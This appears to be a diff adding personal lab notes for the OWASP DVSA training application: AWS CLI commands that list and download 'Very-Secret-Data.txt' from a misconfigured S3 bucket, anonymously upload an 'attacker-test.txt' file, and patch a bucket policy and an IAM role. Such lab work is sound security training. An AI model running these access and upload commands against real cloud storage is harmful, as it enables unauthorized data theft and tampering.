@@ -1,0 +1,22 @@
+//compression ZIP
+Compress-Archive -Path * -DestinationPath ..\order-manager.zip -Force
+
+
+//lesson#3
+aws s3 ls s3://dvsa-receipts-bucket-315527910915-eu-north-1/ --region eu-north-1
+
+aws s3 cp s3://dvsa-receipts-bucket-315527910915-eu-north-1/Very-Secret-Data.txt . --region eu-north-1 
+
+
+aws s3api put-bucket-policy --bucket dvsa-receipts-bucket-315527910915-eu-north-1 --policy file://Patch-Policy-Lesson-3.json --region eu-north-1
+
+
+//lesson#4
+aws s3 cp test.txt s3://dvsa-feedback-bucket-315527910915-eu-north-1/attacker-test.txt --region eu-north-1 --no-sign-request
+
+
+//lesson#5
+aws iam attach-role-policy `
+    --role-name "serverlessrepo-OWASP-DVSA-AdminUpdateOrdersFunction-YVUaFpXZV1Ug" `
+    --policy-arn "arn:aws:iam::aws:policy/AmazonCognitoPowerUser" `
+    --region eu-north-1
